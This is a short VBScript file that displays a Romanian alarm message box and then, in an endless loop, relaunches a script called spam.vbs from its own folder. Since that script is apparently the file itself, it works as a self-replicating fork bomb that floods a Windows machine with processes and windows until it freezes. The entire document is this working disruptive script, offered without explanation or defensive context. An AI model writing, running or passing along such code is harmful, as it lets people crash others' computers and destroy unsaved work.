Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

Sub RecursiveTask()
    MsgBox "ATENTIUNE: A VENIT BELEAUA!!!", vbExclamation, "Warning"

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim scriptPath
    scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\spam.vbs"

    while true
         shell.Run """" & scriptPath & """", 1, False
    wend
    Exit Sub
End Sub

RecursiveTask()